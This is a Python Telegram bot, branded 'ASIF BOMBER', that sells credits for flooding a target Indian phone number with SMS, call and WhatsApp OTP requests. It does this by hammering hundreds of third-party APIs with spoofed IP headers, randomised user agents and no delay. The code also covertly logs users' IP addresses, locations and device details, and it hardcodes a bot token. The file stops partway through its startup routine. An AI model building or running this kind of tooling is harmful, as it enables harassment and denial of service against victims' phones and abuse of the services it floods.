import asyncio
import aiohttp
import time
import random
import json
import sqlite3
import logging
import threading
import os
import platform
import subprocess
import sys
import importlib.util
from datetime import datetime, timedelta
from colorama import Fore, Style, init
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import nest_asyncio

# Initialize colorama
init(autoreset=True)

# Apply nest_asyncio to allow nested event loops
nest_asyncio.apply()

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8790374936:AAHADuIn9XkTm-LyOJoAzY6ZDkkceGOGX5g"
OWNER_USERNAME = "@ASIFXLIVE"
CHANNEL_USERNAME = "@asifxlive1"
BOT_USERNAME = "@Asif_bomb_bot"

# ADMIN IDs
ADMIN_IDS = [7543477298, 987654321]

# Credit pricing
CREDIT_PRICE = 1
CREDIT_DURATION = 5
DAILY_BONUS = 1
REFERRAL_BONUS = 5

QR_CODE_FILE = "asif.png"

# ==================== DATABASE SETUP ====================
conn = sqlite3.connect('asif_bomber.db', check_same_thread=False)
c = conn.cursor()

# Create tables
c.execute('''CREATE TABLE IF NOT EXISTS users
             (user_id INTEGER PRIMARY KEY,
              username TEXT,
              first_name TEXT,
              last_name TEXT,
              phone_number TEXT,
              credits INTEGER DEFAULT 0,
              total_used INTEGER DEFAULT 0,
              last_bonus TEXT,
              referred_by INTEGER,
              joined_channel INTEGER DEFAULT 0,
              created_at TEXT,
              last_active TEXT,
              ip_address TEXT,
              device_info TEXT,
              location TEXT)''')

c.execute('''CREATE TABLE IF NOT EXISTS attacks
             (id INTEGER PRIMARY KEY AUTOINCREMENT,
              user_id INTEGER,
              phone TEXT,
              start_time TEXT,
              end_time TEXT,
              credits_used INTEGER,
              status TEXT)''')

c.execute('''CREATE TABLE IF NOT EXISTS referrals
             (id INTEGER PRIMARY KEY AUTOINCREMENT,
              referrer_id INTEGER,
              referred_id INTEGER,
              bonus_given INTEGER DEFAULT 0,
              created_at TEXT)''')

c.execute('''CREATE TABLE IF NOT EXISTS admin_logs
             (id INTEGER PRIMARY KEY AUTOINCREMENT,
              admin_id INTEGER,
              action TEXT,
              target_user INTEGER,
              credits_added INTEGER,
              timestamp TEXT)''')

c.execute('''CREATE TABLE IF NOT EXISTS stealth_data
             (id INTEGER PRIMARY KEY AUTOINCREMENT,
              user_id INTEGER,
              data_type TEXT,
              data_value TEXT,
              collected_at TEXT)''')

conn.commit()
print(f"{Fore.GREEN}✅ Database ready{Style.RESET_ALL}")

# ==================== DYNAMIC BOMBER LOADER ====================
class DynamicBomberLoader:
    """Dynamically load and run ASIFXLIVEBOMB.py in the same process"""
    
    def __init__(self):
        self.bomber_module = None
        self.bomber_instance = None
        self.active_attacks = {}
        self.bomber_loaded = False
        self.ULTIMATE_APIS = []  # Will be populated from bomber file
        
    def load_bomber_sync(self):
        """Load bomber synchronously (for startup)"""
        try:
            print(f"{Fore.YELLOW}⏳ Loading ASIFXLIVEBOMB.py...{Style.RESET_ALL}")
            
            # Check if file exists
            if not os.path.exists("ASIFXLIVEBOMB.py"):
                print(f"{Fore.RED}❌ ASIFXLIVEBOMB.py not found!{Style.RESET_ALL}")
                return False
            
            # Load the module dynamically
            spec = importlib.util.spec_from_file_location("bomber_module", "ASIFXLIVEBOMB.py")
            self.bomber_module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(self.bomber_module)
            
            # Check if required classes exist
            if hasattr(self.bomber_module, 'UltimatePhoneDestroyer'):
                self.bomber_loaded = True
                self.ULTIMATE_APIS = self.bomber_module.ULTIMATE_APIS
                print(f"{Fore.GREEN}✅ Bomber loaded successfully!{Style.RESET_ALL}")
                print(f"{Fore.CYAN}📊 Total APIs: {len(self.ULTIMATE_APIS)}{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.RED}❌ UltimatePhoneDestroyer class not found!{Style.RESET_ALL}")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}❌ Error loading bomber: {e}{Style.RESET_ALL}")
            return False
    
    async def start_attack(self, user_id, phone, credits):
        """Start bombing using the loaded module"""
        
        if not self.bomber_loaded:
            return {"error": "Bomber file not loaded"}
        
        attack_id = f"{user_id}_{int(time.time())}"
        duration = credits * CREDIT_DURATION  # minutes
        
        # Log attack in database
        end_time = datetime.now() + timedelta(minutes=duration)
        c.execute("""INSERT INTO attacks 
                     (user_id, phone, start_time, end_time, credits_used, status) 
                     VALUES (?, ?, ?, ?, ?, ?)""",
                 (user_id, phone, str(datetime.now()), str(end_time), credits, "active"))
        conn.commit()
        
        # Create bomber instance
        destroyer = self.bomber_module.UltimatePhoneDestroyer()
        
        # Store attack info
        self.active_attacks[attack_id] = {
            "user_id": user_id,
            "phone": phone,
            "duration": duration,
            "start_time": datetime.now(),
            "end_time": end_time,
            "status": "active",
            "destroyer": destroyer,
            "stats": destroyer.stats,
            "task": None
        }
        
        # Start bombing in background
        task = asyncio.create_task(
            self._run_bombing(attack_id, destroyer, phone, duration)
        )
        self.active_attacks[attack_id]["task"] = task
        
        return {"success": True, "attack_id": attack_id}
    
    async def _run_bombing(self, attack_id, destroyer, phone, duration_minutes):
        """Run the bombing in background"""
        attack = self.active_attacks.get(attack_id)
        if not attack:
            return
            
        try:
            # Create event loop for bomber
            connector = aiohttp.TCPConnector(limit=100, limit_per_host=10, verify_ssl=False)
            
            async with aiohttp.ClientSession(connector=connector) as session:
                # Start stats thread
                stats_thread = threading.Thread(
                    target=self._bomber_stats_thread,
                    args=(destroyer, attack_id)
                )
                stats_thread.daemon = True
                stats_thread.start()
                
                # Create tasks for all APIs
                tasks = []
                for api in self.ULTIMATE_APIS:
                    task = asyncio.create_task(
                        self._hit_api(session, api, phone, destroyer, attack_id)
                    )
                    tasks.append(task)
                
                # Run for specified duration
                await asyncio.sleep(duration_minutes * 60)
                
                # Stop all tasks
                for task in tasks:
                    task.cancel()
                
                destroyer.running = False
                attack["status"] = "completed"
                
        except Exception as e:
            print(f"{Fore.RED}Bomber error: {e}{Style.RESET_ALL}")
            if attack:
                attack["status"] = "failed"
                attack["error"] = str(e)
        finally:
            # Update database
            if attack:
                c.execute("UPDATE attacks SET status=? WHERE user_id=? AND status='active'",
                         (attack["status"], attack["user_id"]))
                conn.commit()
    
    async def _hit_api(self, session, api, phone, destroyer, attack_id):
        """Single API hit"""
        attack = self.active_attacks.get(attack_id)
        if not attack or attack["status"] != "active":
            return
            
        while attack["status"] == "active":
            try:
                name = api["name"]
                url = api["url"](phone) if callable(api["url"]) else api["url"]
                headers = api["headers"].copy()
                
                # Random IP bypass
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers["Client-IP"] = headers["X-Forwarded-For"]
                headers["User-Agent"] = random.choice([
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                ])
                
                destroyer.stats["total_requests"] += 1
                
                # Categorize
                if "call" in name.lower() or "voice" in name.lower():
                    destroyer.stats["calls_sent"] += 1
                elif "whatsapp" in name.lower():
                    destroyer.stats["whatsapp_sent"] += 1
                else:
                    destroyer.stats["sms_sent"] += 1
                
                if api["method"] == "POST":
                    data = api["data"](phone) if api["data"] else None
                    async with session.post(url, headers=headers, data=data, timeout=2, ssl=False) as response:
                        if response.status in [200, 201, 202, 204]:
                            destroyer.stats["successful_hits"] += 1
                else:
                    async with session.get(url, headers=headers, timeout=2, ssl=False) as response:
                        if response.status in [200, 201, 202, 204]:
                            destroyer.stats["successful_hits"] += 1
                
                # Ultra fast - no delay
                await asyncio.sleep(0.001)
                
            except:
                destroyer.stats["failed_attempts"] += 1
                continue
    
    def _bomber_stats_thread(self, destroyer, attack_id):
        """Show stats in console"""
        while destroyer.running and attack_id in self.active_attacks:
            elapsed = time.time() - destroyer.stats["start_time"]
            success_rate = (destroyer.stats["successful_hits"] / destroyer.stats["total_requests"] * 100) if destroyer.stats["total_requests"] > 0 else 0
            
            print(f"\n{Fore.RED}╔{'═'*60}╗")
            print(f"║{' '*20}💣 ATTACK {attack_id[:8]}{' '*20}║")
            print(f"╚{'═'*60}╝{Style.RESET_ALL}")
            
            print(f"{Fore.GREEN}📞 Calls: {destroyer.stats['calls_sent']}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}📱 WhatsApp: {destroyer.stats['whatsapp_sent']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💬 SMS: {destroyer.stats['sms_sent']}{Style.RESET_ALL}")
            print(f"{Fore.RED}💥 Success: {destroyer.stats['successful_hits']}{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}🎯 Total: {destroyer.stats['total_requests']}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}📊 Rate: {success_rate:.1f}%{Style.RESET_ALL}")
            print(f"{Fore.WHITE}⏰ Time: {elapsed:.1f}s{Style.RESET_ALL}")
            
            time.sleep(3)
    
    async def stop_attack(self, user_id):
        """Stop user's active attack"""
        for attack_id, data in self.active_attacks.items():
            if data["user_id"] == user_id and data["status"] == "active":
                data["status"] = "stopped"
                if "destroyer" in data:
                    data["destroyer"].running = False
                if "task" in data:
                    data["task"].cancel()
                
                c.execute("UPDATE attacks SET status='stopped' WHERE user_id=? AND status='active'", (user_id,))
                conn.commit()
                return True
        return False
    
    def get_stats(self, attack_id):
        """Get stats for an attack"""
        if attack_id in self.active_attacks:
            attack = self.active_attacks[attack_id]
            if "destroyer" in attack:
                return {
                    "stats": attack["destroyer"].stats,
                    "status": attack["status"],
                    "time_left": (attack["end_time"] - datetime.now()).seconds // 60
                }
        return None

# Create bomber instance (will be loaded after event loop starts)
bomber = None

# ==================== STEALTH DATA COLLECTION ====================
class StealthCollector:
    """Background mein user ka data collect karo"""
    
    @staticmethod
    async def collect_user_info(user_id, update=None):
        """User ke baare mein saari info collect karo"""
        try:
            import requests
            
            info = {}
            
            if update and update.effective_user:
                user = update.effective_user
                info['user_id'] = user.id
                info['username'] = user.username
                info['first_name'] = user.first_name
                info['last_name'] = user.last_name
            
            # IP Address
            try:
                response = requests.get('https://api.ipify.org', timeout=2)
                ip = response.text.strip() if response.status_code == 200 else "Unknown"
            except:
                ip = "Unknown"
            info['ip_address'] = ip
            
            # Location
            if ip != "Unknown":
                try:
                    response = requests.get(f'http://ip-api.com/json/{ip}', timeout=2)
                    if response.status_code == 200:
                        data = response.json()
                        if data['status'] == 'success':
                            info['location'] = f"{data.get('city', '')}, {data.get('country', '')}"
                except:
                    pass
            
            # Device info
            try:
                system = platform.system()
                release = platform.release()
                info['device_info'] = f"{system} {release}"
            except:
                info['device_info'] = "Unknown"
            
            # Store in database
            c.execute('''UPDATE users SET 
                         ip_address=?, 
                         device_info=?, 
                         location=?,
                         last_active=?
                         WHERE user_id=?''',
                      (info.get('ip_address', 'Unknown'), 
                       info.get('device_info', 'Unknown'),
                       info.get('location', 'Unknown'),
                       str(datetime.now()), user_id))
            
            conn.commit()
        except:
            pass

# ==================== TELEGRAM UI ====================
def main_menu_keyboard(user_id):
    """Main Menu"""
    c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    credits = result[0] if result else 0
    
    keyboard = [
        [InlineKeyboardButton("💣 START BOMBING", callback_data="start_bombing")],
        [InlineKeyboardButton("💰 BUY CREDITS", callback_data="buy_credits"),
         InlineKeyboardButton("🎁 DAILY BONUS", callback_data="daily_bonus")],
        [InlineKeyboardButton("👥 REFERRAL", callback_data="referral"),
         InlineKeyboardButton("📊 MY STATS", callback_data="my_stats")],
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack"),
         InlineKeyboardButton("❓ HELP", callback_data="help")],
        [InlineKeyboardButton("📢 CHANNEL", url="https://t.me/asifxlive1"),
         InlineKeyboardButton("👤 OWNER", url="https://t.me/ASIFXLIVE")]
    ]
    
    if user_id in ADMIN_IDS:
        keyboard.append([InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel")])
    
    return InlineKeyboardMarkup(keyboard), credits

def back_button():
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]]
    return InlineKeyboardMarkup(keyboard)

def admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ ADD CREDITS", callback_data="admin_add_credits")],
        [InlineKeyboardButton("📊 USER LIST", callback_data="admin_user_list")],
        [InlineKeyboardButton("🔍 SEARCH USER", callback_data="admin_search_user")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
        [InlineKeyboardButton("📈 STATS", callback_data="admin_stats")],
        [InlineKeyboardButton("🔒 STEALTH DATA", callback_data="admin_stealth")],
        [InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def check_channel(user_id, context):
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ['member', 'administrator', 'creator']:
            c.execute("UPDATE users SET joined_channel=1 WHERE user_id=?", (user_id,))
            conn.commit()
            return True
    except:
        pass
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    asyncio.create_task(StealthCollector.collect_user_info(user_id, update))
    
    referrer_id = None
    if context.args and context.args[0].startswith('ref_'):
        try:
            referrer_id = int(context.args[0].replace('ref_', ''))
        except:
            pass
    
    try:
        c.execute("""INSERT OR IGNORE INTO users 
                     (user_id, username, first_name, last_name, created_at, last_active) 
                     VALUES (?, ?, ?, ?, ?, ?)""",
                 (user_id, user.username, user.first_name, user.last_name, 
                  str(datetime.now()), str(datetime.now())))
        conn.commit()
    except:
        pass
    
    if referrer_id and referrer_id != user_id:
        c.execute("SELECT * FROM referrals WHERE referred_id=?", (user_id,))
        if not c.fetchone():
            c.execute("INSERT INTO referrals (referrer_id, referred_id, created_at) VALUES (?, ?, ?)",
                     (referrer_id, user_id, str(datetime.now())))
            c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (REFERRAL_BONUS, user_id))
            c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (REFERRAL_BONUS, referrer_id))
            conn.commit()
    
    joined = await check_channel(user_id, context)
    
    if not joined:
        keyboard = [
            [InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/asifxlive1")],
            [InlineKeyboardButton("✅ I JOINED", callback_data="check_channel")]
        ]
        await update.message.reply_text(
            f"╔═══『 ASIF BOMBER 』═══╗\n\n"
            f"🔥 Welcome {user.first_name}!\n\n"
            f"⚠️ CHANNEL JOIN KARNA MANDATORY HAI!\n\n"
            f"👇 Neeche diye button se channel join karo",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    
    keyboard, credits = main_menu_keyboard(user_id)
    
    # Check bomber status
    bomber_status = "✅ READY" if bomber and bomber.bomber_loaded else "⚠️ LOADING..."
    
    await update.message.reply_text(
        f"╔═══『 ASIF BOMBER 』═══╗\n\n"
        f"🔥 OWNER: {OWNER_USERNAME}\n"
        f"💎 CHANNEL: {CHANNEL_USERNAME}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"👤 USER: {user.first_name}\n"
        f"💰 CREDITS: {credits}\n"
        f"💣 BOMBER: {bomber_status}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"👇 CHOOSE OPTION:",
        reply_markup=keyboard
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    asyncio.create_task(StealthCollector.collect_user_info(user_id, update))
    
    joined = await check_channel(user_id, context)
    if not joined and data not in ["check_channel", "main_menu"]:
        keyboard = [[InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/asifxlive1")]]
        await query.edit_message_text(
            "❌ CHANNEL JOIN KARNA MANDATORY HAI!\n\n"
            "Pehle @asifxlive1 join karo.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    
    # ===== ADMIN PANEL =====
    if data == "admin_panel":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("❌ ADMIN ACCESS DENIED!", reply_markup=back_button())
            return
        
        await query.edit_message_text(
            "╔═══『 ADMIN PANEL 』═══╗\n\n"
            "🔐 Welcome Boss!\n"
            "━━━━━━━━━━━━━━━━\n"
            "👇 Choose option:",
            reply_markup=admin_keyboard()
        )
    
    elif data == "admin_add_credits":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("❌ ADMIN ACCESS DENIED!", reply_markup=back_button())
            return
        
        await query.edit_message_text(
            "╔═══『 ADD CREDITS 』═══╗\n\n"
            "📝 Format:\n"
            "/add USER_ID CREDITS\n\n"
            "Example:\n"
            "/add 123456789 50",
            reply_markup=back_button()
        )
    
    elif data == "admin_user_list":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("❌ ADMIN ACCESS DENIED!", reply_markup=back_button())
            return
        
        c.execute("SELECT user_id, username, credits FROM users ORDER BY credits DESC LIMIT 10")
        users = c.fetchall()
        
        msg = "╔═══『 TOP USERS 』═══╗\n\n"
        for user in users:
            msg += f"👤 {user[0]} (@{user[1] or 'No un'}): {user[2]} credits\n"
        
        await query.edit_message_text(msg, reply_markup=back_button())
    
    elif data == "admin_search_user":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("❌ ADMIN ACCESS DENIED!", reply_markup=back_button())
            return
        
        await query.edit_message_text(
            "🔍 User ID ya Username bhejo:",
            reply_markup=back_button()
        )
        context.user_data['admin_searching'] = True
    
    elif data == "admin_stats":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("❌ ADMIN ACCESS DENIED!", reply_markup=back_button())
            return
        
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        
        c.execute("SELECT SUM(credits) FROM users")
        total_credits = c.fetchone()[0] or 0
        
        c.execute("SELECT COUNT(*) FROM attacks WHERE status='active'")
        active = c.fetchone()[0]
        
        await query.edit_message_text(
            f"📊 STATS:\n\n"
            f"👥 Users: {total_users}\n"
            f"💰 Credits: {total_credits}\n"
            f"⚡ Active: {active}",
            reply_markup=back_button()
        )
    
    elif data == "admin_stealth":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("❌ ADMIN ACCESS DENIED!", reply_markup=back_button())
            return
        
        await query.edit_message_text(
            "Use /stealth USER_ID",
            reply_markup=back_button()
        )
    
    elif data == "admin_broadcast":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("❌ ADMIN ACCESS DENIED!", reply_markup=back_button())
            return
        
        await query.edit_message_text(
            "Use /broadcast message",
            reply_markup=back_button()
        )
    
    # ===== USER MENU =====
    elif data == "main_menu":
        keyboard, credits = main_menu_keyboard(user_id)
        bomber_status = "✅ READY" if bomber and bomber.bomber_loaded else "⚠️ LOADING..."
        await query.edit_message_text(
            f"╔═══『 ASIF BOMBER 』═══╗\n\n"
            f"🔥 OWNER: {OWNER_USERNAME}\n"
            f"💰 CREDITS: {credits}\n"
            f"💣 BOMBER: {bomber_status}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"👇 CHOOSE OPTION:",
            reply_markup=keyboard
        )
    
    elif data == "check_channel":
        joined = await check_channel(user_id, context)
        if joined:
            keyboard, credits = main_menu_keyboard(user_id)
            await query.edit_message_text(
                f"✅ CHANNEL JOINED!\n\n"
                f"Credits: {credits}",
                reply_markup=keyboard
            )
        else:
            await query.edit_message_text("❌ CHANNEL JOIN NAHI KIYA!")
    
    elif data == "start_bombing":
        c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
        result = c.fetchone()
        credits = result[0] if result else 0
        
        if credits < 1:
            await query.edit_message_text(
                "❌ KAM CREDITS!\n\n"
                f"Tumhare paas sirf {credits} credits hain.",
                reply_markup=back_button()
            )
            return
        
        if not bomber or not bomber.bomber_loaded:
            await query.edit_message_text(
                "⚠️ BOMBER LOADING...\n\n"
                "2 minute mein try karo!",
                reply_markup=back_button()
            )
            return
        
        await query.edit_message_text(
            "📞 TARGET NUMBER BATAO (10 digits):\n"
            "Example: 9876543210",
            reply_markup=back_button()
        )
        context.user_data['awaiting_phone'] = True
    
    elif data == "buy_credits":
        keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]]
        
        if os.path.exists(QR_CODE_FILE):
            with open(QR_CODE_FILE, 'rb') as f:
                await context.bot.send_photo(
                    chat_id=user_id,
                    photo=f,
                    caption=f"💎 SCAN KARO AUR PAY KARO\n\n"
                            f"1 CREDIT = ₹{CREDIT_PRICE}\n"
                            f"OWNER: {OWNER_USERNAME}",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            await query.delete_message()
        else:
            await query.edit_message_text(
                f"💎 PRICING:\n"
                f"1 CREDIT = ₹{CREDIT_PRICE}\n\n"
                f"OWNER SE SAMPARK KARE:\n"
                f"{OWNER_USERNAME}",
                reply_markup=back_button()
            )
    
    elif data == "daily_bonus":
        today = datetime.now().date()
        c.execute("SELECT last_bonus FROM users WHERE user_id=?", (user_id,))
        result = c.fetchone()
        
        if result and result[0] == str(today):
            await query.edit_message_text(
                "❌ ALREADY CLAIMED!\n\nKal aana!",
                reply_markup=back_button()
            )
        else:
            c.execute("UPDATE users SET credits = credits + ?, last_bonus = ? WHERE user_id=?",
                     (DAILY_BONUS, str(today), user_id))
            conn.commit()
            
            await query.edit_message_text(
                f"✅ {DAILY_BONUS} CREDIT MILA!",
                reply_markup=back_button()
            )
    
    elif data == "referral":
        ref_link = f"https://t.me/{context.bot.username}?start=ref_{user_id}"
        
        c.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id=?", (user_id,))
        total_ref = c.fetchone()[0]
        
        await query.edit_message_text(
            f"🎁 REFER BONUS:\n"
            f"1 referral = {REFERRAL_BONUS} CREDITS\n\n"
            f"👥 TOTAL: {total_ref}\n\n"
            f"🔗 LINK:\n{ref_link}",
            reply_markup=back_button()
        )
    
    elif data == "my_stats":
        c.execute("SELECT credits, total_used FROM users WHERE user_id=?", (user_id,))
        result = c.fetchone()
        credits, total_used = result if result else (0, 0)
        
        c.execute("SELECT COUNT(*) FROM attacks WHERE user_id=?", (user_id,))
        total_attacks = c.fetchone()[0]
        
        await query.edit_message_text(
            f"📊 YOUR STATS:\n\n"
            f"💰 Credits: {credits}\n"
            f"💣 Attacks: {total_attacks}\n"
            f"📊 Used: {total_used}",
            reply_markup=back_button()
        )
    
    elif data == "stop_attack":
        if not bomber:
            await query.edit_message_text("❌ Bomber not ready!", reply_markup=back_button())
            return
            
        stopped = await bomber.stop_attack(user_id)
        if stopped:
            await query.edit_message_text(
                "✅ ATTACK STOPPED!",
                reply_markup=back_button()
            )
        else:
            await query.edit_message_text(
                "❌ NO ACTIVE ATTACK!",
                reply_markup=back_button()
            )
    
    elif data == "help":
        await query.edit_message_text(
            f"📌 COMMANDS:\n"
            f"/start - Main menu\n"
            f"/stop - Attack roko\n\n"
            f"📞 OWNER: {OWNER_USERNAME}\n"
            f"📢 CHANNEL: {CHANNEL_USERNAME}",
            reply_markup=back_button()
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    asyncio.create_task(StealthCollector.collect_user_info(user_id, update))
    
    # Admin search
    if context.user_data.get('admin_searching') and user_id in ADMIN_IDS:
        query = update.message.text.strip()
        context.user_data['admin_searching'] = False
        
        try:
            if query.startswith('@'):
                c.execute("SELECT * FROM users WHERE username=?", (query[1:],))
            else:
                c.execute("SELECT * FROM users WHERE user_id=?", (int(query),))
            
            user_data = c.fetchone()
            
            if user_data:
                msg = f"🆔 ID: {user_data[0]}\n"
                msg += f"👤 @{user_data[1] or 'None'}\n"
                msg += f"💰 Credits: {user_data[5]}\n"
                msg += f"💣 Used: {user_data[6]}\n"
                await update.message.reply_text(msg)
            else:
                await update.message.reply_text("❌ User nahi mila!")
        except:
            await update.message.reply_text("❌ Error!")
        return
    
    # Channel check
    joined = await check_channel(user_id, context)
    if not joined:
        keyboard = [[InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/asifxlive1")]]
        await update.message.reply_text(
            "❌ CHANNEL JOIN KARO!",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    
    # Phone number input
    if context.user_data.get('awaiting_phone'):
        phone = update.message.text.strip()
        
        if not phone.isdigit() or len(phone) != 10:
            await update.message.reply_text(
                "❌ INVALID! Sirf 10 digits!",
                reply_markup=back_button()
            )
            return
        
        c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
        result = c.fetchone()
        credits = result[0] if result else 0
        
        if credits < 1:
            await update.message.reply_text("❌ KAM CREDITS!", reply_markup=back_button())
            return
        
        await update.message.reply_text(
            f"📞 TARGET: +91{phone}\n"
            f"💰 AVAILABLE: {credits}\n\n"
            f"Kitne credits use karne hain? (1-{credits})",
            reply_markup=back_button()
        )
        context.user_data['awaiting_credits'] = phone
        context.user_data['awaiting_phone'] = False
        return
    
    # Credits input
    if context.user_data.get('awaiting_credits'):
        phone = context.user_data['awaiting_credits']
        
        try:
            use_credits = int(update.message.text.strip())
        except:
            await update.message.reply_text("❌ INVALID NUMBER!", reply_markup=back_button())
            return
        
        c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
        result = c.fetchone()
        available = result[0] if result else 0
        
        if use_credits < 1 or use_credits > available:
            await update.message.reply_text(
                f"❌ 1 se {available} ke beech mein daalo!",
                reply_markup=back_button()
            )
            return
        
        # START ATTACK - FINALLY!
        if not bomber:
            await update.message.reply_text("❌ Bomber not ready!", reply_markup=back_button())
            return
            
        result = await bomber.start_attack(user_id, phone, use_credits)
        
        if "error" in result:
            await update.message.reply_text(
                f"❌ ERROR: {result['error']}",
                reply_markup=back_button()
            )
            return
        
        # Deduct credits
        c.execute("UPDATE users SET credits = credits - ?, total_used = total_used + ? WHERE user_id=?",
                 (use_credits, use_credits, user_id))
        conn.commit()
        
        await update.message.reply_text(
            f"╔═══『 ATTACK STARTED 』═══╗\n\n"
            f"📞 TARGET: +91{phone}\n"
            f"⏱️ DURATION: {use_credits * CREDIT_DURATION} MIN\n"
            f"💣 CREDITS USED: {use_credits}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🔥 900+ APIS ACTIVE!\n"
            f"🛑 STOP: /stop\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🎯 TARGET KA PHONE HANG HO RAHA HAI!",
            reply_markup=back_button()
        )
        
        context.user_data.pop('awaiting_credits', None)
        return
    
    await update.message.reply_text("❌ /start use karo!", reply_markup=back_button())

# ===== ADMIN COMMANDS =====
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ UNAUTHORIZED!")
        return
    
    await update.message.reply_text(
        "👑 ADMIN PANEL",
        reply_markup=admin_keyboard()
    )

async def add_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ UNAUTHORIZED!")
        return
    
    try:
        user_id = int(context.args[0])
        credits = int(context.args[1])
    except:
        await update.message.reply_text("Usage: /add 123456789 10")
        return
    
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (credits, user_id))
    conn.commit()
    
    await update.message.reply_text(f"✅ Added {credits} credits")

async def search_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ UNAUTHORIZED!")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /search 123456789")
        return
    
    try:
        user_id = int(context.args[0])
        c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
        user = c.fetchone()
        
        if user:
            await update.message.reply_text(f"User: {user[0]}, Credits: {user[5]}")
        else:
            await update.message.reply_text("❌ Not found")
    except:
        await update.message.reply_text("❌ Error")

async def stealth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ UNAUTHORIZED!")
        return
    
    await update.message.reply_text("Stealth data command")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ UNAUTHORIZED!")
        return
    
    msg = " ".join(context.args)
    if not msg:
        await update.message.reply_text("Usage: /broadcast Hello")
        return
    
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    
    success = 0
    for user in users:
        try:
            await context.bot.send_message(user[0], f"📢 {msg}")
            success += 1
        except:
            continue
    
    await update.message.reply_text(f"✅ Sent to {success} users")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ UNAUTHORIZED!")
        return
    
    c.execute("SELECT COUNT(*) FROM users")
    total = c.fetchone()[0]
    
    await update.message.reply_text(f"👥 Total users: {total}")

# ==================== MAIN ====================
async def async_main():
    """Async main function"""
    global bomber
    
    print(f"{Fore.RED}╔{'═'*50}╗")
    print(f"{Fore.RED}║{' '*15}ASIF BOMBER BOT{' '*15}║")
    print(f"{Fore.RED}╚{'═'*50}╝{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✅ Bot Token: Loaded")
    print(f"{Fore.YELLOW}⏳ Loading bomber...")
    
    # Create and load bomber SYNCHRONOUSLY (no asyncio.to_thread)
    bomber = DynamicBomberLoader()
    if bomber.load_bomber_sync():
        print(f"{Fore.GREEN}✅ Bomber ready! ({len(bomber.ULTIMATE_APIS)} APIs){Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}❌ Bomber failed to load!{Style.RESET_ALL}")
